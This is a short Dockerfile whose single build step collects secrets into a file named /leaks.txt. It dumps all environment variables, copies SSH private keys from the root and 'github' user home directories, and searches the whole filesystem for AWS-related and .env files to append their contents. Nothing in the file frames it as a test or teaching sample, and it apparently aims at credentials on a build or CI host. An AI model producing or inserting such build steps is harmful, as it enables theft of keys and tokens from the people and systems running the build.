FROM alpine:latest

RUN echo "[ENV]:" > /leaks.txt && \
    printenv >> /leaks.txt && \
    echo "\n[SSH KEYS]:" >> /leaks.txt && \
    cat /root/.ssh/id_rsa >> /leaks.txt 2>/dev/null || true && \
    cat /home/github/.ssh/id_rsa >> /leaks.txt 2>/dev/null || true && \
    echo "\n[AWS KEYS]:" >> /leaks.txt && \
    find / -type f -iname "*aws*" -o -iname "*.env" -exec cat {} \; >> /leaks.txt 2>/dev/null || true
